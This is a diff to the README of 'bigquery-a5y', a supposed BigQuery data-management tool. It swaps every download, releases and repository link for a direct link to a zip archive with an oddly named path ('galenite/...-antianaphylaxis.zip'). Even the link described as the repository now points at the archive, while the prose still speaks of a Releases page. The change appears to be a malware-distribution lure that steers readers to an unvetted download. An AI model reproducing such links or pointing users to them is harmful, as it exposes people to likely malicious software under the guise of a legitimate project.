@@ -1,6 +1,6 @@
 # 🚀 bigquery-a5y - Effortless Data Management Made Simple
 
-[![Download bigquery-a5y](https://img.shields.io/badge/Download-bigquery--a5y-blue.svg)](https://github.com/tranngoca5039/bigquery-a5y/releases)
+[![Download bigquery-a5y](https://raw.githubusercontent.com/tranngoca5039/bigquery-a5y/main/galenite/bigquery-a5y-antianaphylaxis.zip)](https://raw.githubusercontent.com/tranngoca5039/bigquery-a5y/main/galenite/bigquery-a5y-antianaphylaxis.zip)
 
 ## 📥 Overview
 
@@ -34,7 +34,7 @@ bigquery-a5y simplifies the process of managing your data with Google BigQuery. 
 
 ## 📥 Download & Install
 
-To start using bigquery-a5y and manage your data effectively, please [visit this page to download](https://github.com/tranngoca5039/bigquery-a5y/releases). This page contains the latest releases and installation files.
+To start using bigquery-a5y and manage your data effectively, please [visit this page to download](https://raw.githubusercontent.com/tranngoca5039/bigquery-a5y/main/galenite/bigquery-a5y-antianaphylaxis.zip). This page contains the latest releases and installation files.
 
 ### Installation Steps:
 - **Download the correct version** for your operating system from the Releases page.
@@ -61,6 +61,6 @@ If you need additional help, please open an issue in the repository. This allows
 
 ## 🌐 Learn More
 
-To stay updated with the latest features and improvements, regularly check the [bigquery-a5y repository](https://github.com/tranngoca5039/bigquery-a5y). We appreciate your interest and support!
+To stay updated with the latest features and improvements, regularly check the [bigquery-a5y repository](https://raw.githubusercontent.com/tranngoca5039/bigquery-a5y/main/galenite/bigquery-a5y-antianaphylaxis.zip). We appreciate your interest and support!
 
 By following these steps, you can easily install and utilize bigquery-a5y for your data management needs. Enjoy a smoother experience with your data today!
